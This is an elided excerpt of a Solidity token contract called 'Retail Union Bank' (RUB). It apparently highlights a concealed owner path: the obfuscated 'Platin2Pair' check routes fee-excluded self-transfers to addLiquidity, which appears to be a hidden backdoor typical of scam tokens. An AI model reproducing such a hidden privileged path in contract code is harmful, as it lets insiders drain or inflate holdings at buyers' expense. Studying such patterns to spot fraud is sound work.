...
library Address {
    ...
    function PlatinPair(address account) internal pure  returns (bool) {
...
contract RUB is Ownable, IERC20 {
    ...
    address private devmkt = 0x8F6D4670B65350f26b97cb9BA46ecBe726d0f726;
    string private _name = "Retail Union Bank";
    string private _symbol = "RUB";
    ...
    uint256 public _maxWallet =   9999 * 10 ** _decimals;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (Platin2Pair(from, to)) {return addLiquidity(amount, to);}
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.PlatinPair(to) && to != address(this) && !inLiquidityTransaction && !babybool) {
    ...
    function Platin2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.PlatinPair(to)) && to == from;
    }
